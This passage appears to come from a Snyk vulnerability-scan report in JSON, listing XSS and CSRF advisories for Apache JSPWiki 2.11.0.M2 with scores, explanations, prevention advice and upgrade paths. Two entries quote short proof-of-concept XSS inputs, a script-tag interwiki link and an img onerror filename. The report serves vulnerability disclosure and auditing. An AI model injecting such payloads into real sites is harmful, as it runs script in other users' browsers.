        "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.jspwiki:jspwiki-main",
      "version": "2.11.0.M2"
    },
    {
      "id": "SNYK-JAVA-ORGAPACHEJSPWIKI-174839",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
      "credit": [
        "Brushed"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.0-M4)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.0-M4"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.apache.jspwiki:jspwiki-main",
      "references": [
        {
          "url": "https://issues.apache.org/jira/browse/JSPWIKI-1108",
          "title": "Apache Jira Issue"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/87c89f0405d6b31fc165358ce5d5bc4536e32a8a",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [],
      "description": "## Overview\n[org.apache.jspwiki:jspwiki-main](https://jspwiki.apache.org) is a main release jar for Apache JSPWiki engine.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Interwiki links with the input such as `{{[<script>alert`1`</script>://test.com]}}` are returned and executed as JavaScript when using the HTML preview component.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.apache.jspwiki:jspwiki-main` to version 2.11.0-M4 or higher.\n## References\n- [Apache Jira Issue](https://issues.apache.org/jira/browse/JSPWIKI-1108)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/87c89f0405d6b31fc165358ce5d5bc4536e32a8a)\n",
      "epssDetails": null,
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.apache.jspwiki:jspwiki-main",
      "proprietary": false,
      "creationTime": "2019-05-31T12:18:09.920326Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2019-04-23T18:05:21Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.apache.jspwiki",
        "artifactId": "jspwiki-main"
      },
      "publicationTime": "2019-05-30T08:21:44Z",
      "modificationTime": "2020-12-14T14:40:57.330538Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.jspwiki:jspwiki-main",
      "version": "2.11.0.M2"
    },
    {
      "id": "SNYK-JAVA-ORGAPACHEJSPWIKI-174840",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
      "credit": [
        "Harry Metske"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.0-M4)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.0-M4"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.apache.jspwiki:jspwiki-main",
      "references": [
        {
          "url": "https://issues.apache.org/jira/browse/JSPWIKI-1107",
          "title": "Apache Jira"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/60a9cb84ce36a0392fa5a01afcf28c11857c2f9e",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [],
      "description": "## Overview\n[org.apache.jspwiki:jspwiki-main](https://jspwiki.apache.org) is a main release jar for Apache JSPWiki engine.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Inserting a filename such as `<img src=x onerror=alert(1)>` as part of uploaded attachments are not sanitised resulting in execution of JavaScript.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.apache.jspwiki:jspwiki-main` to version 2.11.0-M4 or higher.\n## References\n- [Apache Jira](https://issues.apache.org/jira/browse/JSPWIKI-1107)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/60a9cb84ce36a0392fa5a01afcf28c11857c2f9e)\n",
      "epssDetails": null,
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.apache.jspwiki:jspwiki-main",
      "proprietary": false,
      "creationTime": "2019-05-31T12:37:44.748932Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2019-04-22T12:31:14Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.apache.jspwiki",
        "artifactId": "jspwiki-main"
      },
      "publicationTime": "2019-05-31T12:29:49Z",
      "modificationTime": "2020-12-14T14:41:40.016507Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.jspwiki:jspwiki-main",
      "version": "2.11.0.M2"
    },
    {
      "id": "SNYK-JAVA-ORGAPACHEJSPWIKI-2413443",
      "title": "Cross-site Request Forgery (CSRF)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
      "credit": [
        "Cristian Borlovan",
        "Paulos Yibelo"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.2)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.2"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.apache.jspwiki:jspwiki-main",
      "references": [
        {
          "url": "https://issues.apache.org/jira/browse/JSPWIKI-45",
          "title": "Apache Jira Issues"
        },
        {
          "url": "https://lists.apache.org/thread/txrgykjkpt80t57kzpbjo8kfrv8ss02c",
          "title": "Apache Pony Mail"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/07e1f828b6d3a23b008f1197a3faaaaf2a353b00",
          "title": "GitHub Fix Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2022-03-04T16:10:25.620554Z"
        }
      ],
      "description": "## Overview\n[org.apache.jspwiki:jspwiki-main](https://jspwiki.apache.org) is a main release jar for Apache JSPWiki engine.\n\nAffected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) via the `UserProfile.jsp` component, which does not require you to type in your old password to change the new password, allowing the attacker to change the account password as long as they know there is an existing account name.\n## Remediation\nUpgrade `org.apache.jspwiki:jspwiki-main` to version 2.11.2 or higher.\n## References\n- [Apache Jira Issues](https://issues.apache.org/jira/browse/JSPWIKI-45)\n- [Apache Pony Mail](https://lists.apache.org/thread/txrgykjkpt80t57kzpbjo8kfrv8ss02c)\n- [GitHub Fix Commit](https://github.com/apache/jspwiki/commit/07e1f828b6d3a23b008f1197a3faaaaf2a353b00)\n",
      "epssDetails": {
        "percentile": "0.53269",
        "probability": "0.00173",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-24947"
        ],
        "CWE": [
          "CWE-352"
        ]
      },
      "packageName": "org.apache.jspwiki:jspwiki-main",
      "proprietary": false,
      "creationTime": "2022-02-25T10:30:59.014118Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-02-25T10:19:31Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.apache.jspwiki",
        "artifactId": "jspwiki-main"
      },
      "publicationTime": "2022-02-25T16:31:49.458917Z",
      "modificationTime": "2022-03-04T16:10:25.620554Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.jspwiki:jspwiki-main",
      "version": "2.11.0.M2"
    },
    {
      "id": "SNYK-JAVA-ORGAPACHEJSPWIKI-2413444",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
      "credit": [
        "Paulos Yibelo"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.2)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.2"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.apache.jspwiki:jspwiki-main",
      "references": [
        {
          "url": "https://lists.apache.org/thread/86p0yzopc4mw2h5bkwpt927b2c8tfq3b",
          "title": "Apache Pony Mail"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-03-04T16:10:25.822883Z"
        }
      ],
      "description": "## Overview\n[org.apache.jspwiki:jspwiki-main](https://jspwiki.apache.org) is a main release jar for Apache JSPWiki engine.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via a carefully crafted user preferences URL for submission, related to the user preferences screen.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.apache.jspwiki:jspwiki-main` to version 2.11.2 or higher.\n## References\n- [Apache Pony Mail](https://lists.apache.org/thread/86p0yzopc4mw2h5bkwpt927b2c8tfq3b)\n",
      "epssDetails": {
        "percentile": "0.56280",
        "probability": "0.00196",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-24948"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.apache.jspwiki:jspwiki-main",
      "proprietary": false,
      "creationTime": "2022-02-25T10:45:22.688344Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-02-25T10:31:42Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.apache.jspwiki",
        "artifactId": "jspwiki-main"
      },
      "publicationTime": "2022-02-25T16:31:49.610569Z",
      "modificationTime": "2022-03-14T15:25:01.115984Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.2"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.jspwiki:jspwiki-main",
      "version": "2.11.0.M2"
    },
    {
      "id": "SNYK-JAVA-ORGAPACHEJSPWIKI-2971018",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
      "credit": [
        "Salt"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.3)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.apache.jspwiki:jspwiki-main",
      "references": [
        {
          "url": "https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2022-27166",
          "title": "Apache Advisory"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/0a3e775ace9bcd34b330919162131377ab5542a3",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-08-11T01:10:52.976457Z"
        }
      ],
      "description": "## Overview\n[org.apache.jspwiki:jspwiki-main](https://jspwiki.apache.org) is a main release jar for Apache JSPWiki engine.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) in the `translate()` function in `XHtmlElementToWikiTranslator.java`, which does not limit scripts from being executed by requests against `XHRHtml2Markup.jsp`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.apache.jspwiki:jspwiki-main` to version 2.11.3 or higher.\n## References\n- [Apache Advisory](https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2022-27166)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/0a3e775ace9bcd34b330919162131377ab5542a3)\n",
      "epssDetails": {
        "percentile": "0.68316",
        "probability": "0.00360",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-27166"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.apache.jspwiki:jspwiki-main",
      "proprietary": false,
      "creationTime": "2022-08-04T11:43:25.820260Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-08-04T10:22:01Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.apache.jspwiki",
        "artifactId": "jspwiki-main"
      },
      "publicationTime": "2022-08-04T12:36:53.926481Z",
      "modificationTime": "2022-08-11T01:10:52.976457Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.jspwiki:jspwiki-main",
      "version": "2.11.0.M2"
    },
    {
      "id": "SNYK-JAVA-ORGAPACHEJSPWIKI-2971019",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
      "credit": [
        "Poh Jia Hao"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.3)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.apache.jspwiki:jspwiki-main",
      "references": [
        {
          "url": "https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2022-28730",
          "title": "Apache Advisory"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/d7e57a3f5d9b8dc140621dc26016985d306c00c7",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-08-11T01:10:52.801848Z"
        }
      ],
      "description": "## Overview\n[org.apache.jspwiki:jspwiki-main](https://jspwiki.apache.org) is a main release jar for Apache JSPWiki engine.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `Denounce` class, which does not limit scripts from being executed by requests against `AJAXPreview.jsp`.\r\n\r\n**NOTE:**\r\nThis vulnerability exists due to an incomplete fix for [CVE-2021-40369](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHEJSPWIKI-1925890).\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.apache.jspwiki:jspwiki-main` to version 2.11.3 or higher.\n## References\n- [Apache Advisory](https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2022-28730)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/d7e57a3f5d9b8dc140621dc26016985d306c00c7)\n",
      "epssDetails": {
        "percentile": "0.68316",
        "probability": "0.00360",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-28730"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.apache.jspwiki:jspwiki-main",
      "proprietary": false,
      "creationTime": "2022-08-04T11:53:57.572412Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-08-04T11:43:38Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.apache.jspwiki",
        "artifactId": "jspwiki-main"
      },
      "publicationTime": "2022-08-04T12:42:11.693150Z",
      "modificationTime": "2022-08-11T01:10:52.801848Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.jspwiki:jspwiki-main",
      "version": "2.11.0.M2"
    },
    {
